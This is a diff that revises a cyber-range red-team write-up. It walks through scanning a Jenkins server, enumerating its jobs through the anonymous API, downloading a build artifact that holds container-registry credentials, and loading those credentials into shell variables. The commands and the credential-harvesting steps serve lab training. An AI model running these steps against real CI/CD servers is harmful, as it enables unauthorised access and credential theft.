@@ -2,129 +2,76 @@
 ## Red Team Solution Writeup
 **Range:** RNG-DEV-01 · VIKAS TANTRA
 **Machine:** M1 — Jenkins CI/CD Server
-**Vulnerability:** Jenkins Anonymous Read Access + Unauthenticated Build Artifact Download
-**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application) · T1552.001 (Credentials in Files)
+**Vulnerability:** Anonymous Jenkins API access and unauthenticated build artifact download
+**MITRE ATT&CK:** T1190 · T1552.001
 **Severity:** Hard
-**Operator:** Rudra-7 (KAAL CHAKRA CI/CD Specialist)
 
 ---
 
 ## Objective
-From Kali, access the confirmed range host directly. Identify Jenkins with a targeted scan, verify anonymous REST API access, enumerate build jobs, and download the archived `docker-config.json` artifact to continue to M2. The original jump-host key and subnet values are placeholders and are not part of this deployed setup.
 
----
+From Kali, identify Jenkins on the confirmed range host, verify anonymous API access, enumerate build jobs, and retrieve the `docker-config.json` artifact. Keep the same Kali terminal open for M1–M5 so the private workspace and extracted credential variables remain available.
 
 ## Environment
 
 | Item | Value |
 |---|---|
-| Entry | Direct access to the range host from Kali |
-| Target IP | `203.0.3.36` (confirmed range host) |
-| Target Port | 8080 (HTTP) |
-| Auth Required | None (useSecurity=false) |
-| Pivot Artifact | `docker-config.json` in build artefact |
-
----
+| Entry | Direct access from Kali |
+| Target | `203.0.3.36` |
+| Jenkins port | `8080` |
+| Authentication | Anonymous API access |
+| Artifact | `pul-firmware-build` → `deploy-bundle/docker-config.json` |
 
 ## Step-by-Step Exploitation
 
-Keep the same Kali terminal open for M1–M5 so the private workspace and extracted credential variables remain available.
-
-### Step 1 — Targeted Service Scan
+### Step 1 — Scan the confirmed host
 
 ```bash
-# The five range services are hosted on this confirmed lab address.
 nmap -Pn -sV -p 22,8080,5000,9000,9200,8888 203.0.3.36
 ```
 
-This targeted scan confirmed SSH and the five range service ports open on `203.0.3.36`. The original jump-host name and `11.x.x.x/24` subnet are placeholders and are not usable in this deployment.
+This scan confirmed SSH and all five range service ports open on `203.0.3.36`. The original jump-host key and `11.x.x.x/24` subnet are placeholders and do not apply to this deployment.
 
----
-
-### Step 2 — Confirm Unauthenticated Jenkins Access
+### Step 2 — Confirm anonymous Jenkins access
 
 ```bash
-# Test anonymous API access — no credentials sent
 curl --max-time 8 -fsS http://203.0.3.36:8080/api/json | jq '{useSecurity, jobs}'
 ```
 
+The unauthenticated request returned HTTP 200 and `useSecurity: false` in the API response.
 
-
-The response reports `useSecurity: false`; the unauthenticated HTTP 200 confirms anonymous API access.
-
----
-
-### Step 3 — Enumerate Build Jobs
+### Step 3 — Enumerate build jobs
 
 ```bash
-# List all build jobs with artefact details
-curl --globoff --max-time 8 -fsS "http://203.0.3.36:8080/api/json?tree=jobs[name,url,lastBuild[result,artifacts[*]]]" \
-     | jq .
+curl --globoff --max-time 8 -fsS "http://203.0.3.36:8080/api/json?tree=jobs[name,url,lastBuild[result,artifacts[*]]]" | jq .
 ```
 
-`--globoff` is required because curl otherwise treats the square brackets in the `tree=` query as URL glob syntax.
+`--globoff` is required because curl otherwise interprets the square brackets in the `tree=` query as URL glob syntax. The response lists `pul-firmware-build` with a successful build and `deploy-bundle/docker-config.json`.
 
-
-
-Observe the job `pul-firmware-build` with last build result `SUCCESS` and archived artefacts including `deploy-bundle/docker-config.json`.
-
----
-
-### Step 4 — Download Build Artefact
+### Step 4 — Download the build artifact
 
 ```bash
-# Download the artefact directly
 export RANGE3_DIR="$(mktemp -d /tmp/range3.XXXXXX)"
 chmod 700 "$RANGE3_DIR"
-curl --max-time 8 -fsS "http://203.0.3.36:8080/job/pul-firmware-build/lastSuccessfulBuild/artifact/deploy-bundle/docker-config.json" \
-     -o "$RANGE3_DIR/docker-config.json"
+curl --max-time 8 -fsS "http://203.0.3.36:8080/job/pul-firmware-build/lastSuccessfulBuild/artifact/deploy-bundle/docker-config.json" -o "$RANGE3_DIR/docker-config.json"
 jq -r '(.auths | to_entries[0]) | "registry endpoint: \(.key)\ncredential present: \(.value.password != null)"' "$RANGE3_DIR/docker-config.json"
 ```
 
-Output:
-```json
-{
-  "_comment": "PUL Container Registry credentials — DO NOT COMMIT TO VCS",
-  "auths": {
-    "11.x.x.x:5000": {
-      "username": "pul-registry-svc",
-      "password": "<redacted>",
-      "auth": "<redacted>"
-    }
-  },
-  "registry_info": {
-    "endpoint": "11.x.x.x:5000",
-    "purpose": "PUL firmware container registry"
-  }
-}
-```
+The artifact contains the registry username, password field, and base64 `auth` field. Values are redacted here because this writeup is public. The artifact's registry host is the literal placeholder `11.x.x.x:5000`; the registry in this deployment is reachable at `203.0.3.36:5000`.
 
-The artifact contains the literal endpoint placeholder `11.x.x.x:5000`. In this deployment, the registry service is reachable at `203.0.3.36:5000`. Credential values are redacted from this public writeup.
-
-
-
----
-
-### Step 5 — Verify Registry Credential
+### Step 5 — Check the credential fields
 
 ```bash
-# Check whether the embedded base64 auth field matches the separate password field
 REGISTRY_USER="$(jq -r '.auths[] | .username' "$RANGE3_DIR/docker-config.json")"
 REGISTRY_PASSWORD_CANDIDATE="$(jq -r '.auths[] | .password' "$RANGE3_DIR/docker-config.json")"
 AUTH_VALUE="$(jq -r '.auths[] | .auth' "$RANGE3_DIR/docker-config.json" | base64 -d)"
 if test "$AUTH_VALUE" = "$REGISTRY_USER:$REGISTRY_PASSWORD_CANDIDATE"; then echo 'auth field matches password field'; else echo 'auth field does not match password field'; fi
 unset AUTH_VALUE
-
-# Load the artifact fields into this shell without printing them; the password candidate is not independently validated
 export REGISTRY_USER REGISTRY_PASSWORD_CANDIDATE
 printf 'Registry credential loaded for %s\n' "$REGISTRY_USER"
 ```
 
-The artifact's base64 `auth` value decodes to the same username but a different password than the separate `password` field. M2's read API is anonymous, so this inconsistency does not block the documented M2 requests; do not treat the password candidate as validated.
-
-
-
----
+On this artifact the base64 `auth` value decodes to the same username but a different password than the separate password field. Do not treat that password candidate as validated. M2's read API is anonymous, so the mismatch does not block the next documented steps.
 
 ## MITRE ATT&CK Mapping
 
@@ -135,7 +82,6 @@ The artifact's base64 `auth` value decodes to the same username but a different 
 | Discovery | Network Service Discovery | T1046 |
 | Collection | Data from Local System | T1005 |
 
----
-
 ## Notes for Operator
-The Jenkins console output for build #1 explicitly mentions the `docker-config.json` file placement and a TODO comment by `arun.sharma@prabalurja.in` about Vault migration. This is consistent with KAAL CHAKRA's observed TTP of exploiting shortcut credential storage in CI/CD pipelines (RedEcho campaign pattern).
+
+The public Jenkins API response reports `useSecurity: false`. On the host, `config.xml` has `useSecurity=true` but uses `SecurityRealm$None` and `AuthorizationStrategy$Unsecured`, so the flag does not indicate that access is protected.
